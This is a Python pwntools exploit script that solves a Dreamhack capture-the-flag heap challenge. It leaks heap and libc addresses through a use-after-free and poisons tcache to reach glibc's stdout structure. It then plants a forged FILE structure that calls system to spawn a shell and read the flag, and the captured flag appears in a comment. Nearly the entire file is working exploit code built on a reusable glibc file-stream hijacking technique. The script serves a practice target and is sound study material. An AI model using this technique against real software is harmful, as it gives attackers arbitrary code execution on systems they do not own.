#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './chall_patched'
HOST = 'host8.dreamhack.games'
PORT = 24544

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
# brva 0x133d
# brva 0x14ec
# brva 0x15ca
# brva 0x168f
b _IO_flush_all
b*0x155555200000+0x8e9bf
b*0x155555200000+0x8ea13
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe_path, aslr=False)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(idx, data):
    sla(b'choice: ', b'1')
    sla(b' (0-4): ', str(idx).encode())
    sa(b'creation: ', data)
def update(idx, data):
    sla(b'choice: ', b'2')
    sla(b' (0-4): ', str(idx).encode())
    sa(b'update: ', data)
def read(idx):
    sla(b'choice: ', b'3')
    sla(b' (0-4): ', str(idx).encode())
def delete(idx):
    sla(b'choice: ', b'4')
    sla(b' (0-4): ', str(idx).encode())

# leak heap
create(0, b'A' * 0x20)
create(1, b'B' * 0x20)

delete(0)
read(0)
rcu(b"data: ")
heap = u64(rl().strip().ljust(8, b'\x00')) <<12
log.info(f'heap: {hex(heap)}')

# leak libc
for i in range(6):
    update(1, b'C' * 0x20)
    delete(1)
# delete chunk 1 to prevent unsorted and tcache overlapping
for i in range(1):
    update(0, b'C' * 0x20)
    delete(0)
    
read(0)
rcu(b"data: ")
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
log.info(f'libc: {hex(libc.address)}')
target = libc.symbols['_IO_2_1_stdout_'] + 0x60
update(1, p64(target ^ (heap >> 12)))
create(2, b"OKAY")

# set up fake FILE struct on heap
system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._IO_write_ptr = 0x10
fp._IO_write_base = 0
fp._lock = heap+0x2d8 + 0x50
fp._wide_data = heap+0x2d8 # fake FILE struct
fp.vtable = libc.symbols['_IO_wfile_jumps']
payload = bytes(fp) + p64(heap+0x2d8 + 0x10 - 0x68)

main_arena = libc.address+0x21ace0

fake_struct = flat(
    p64(main_arena)*2, p64(0x0)*5,
    payload
)

# update 2 chunks as we cant write all in one go
update(0, fake_struct[:0xa0])
update(1, fake_struct[0xc0:])

# overwrite stdout->chain with fake FILE struct
create(3, p64(0) + p64(heap+0x2d8))
# b*libc+0x45540 / 0x8e8e0 / 0x8ea13 / 0x8e9bf
sla(b'choice: ', b'5')
sl(b'cat flag*')

# DH{f8324b2709c683d1:FRhGNvo/whJNcimkT9JD2Q==}
p.interactive()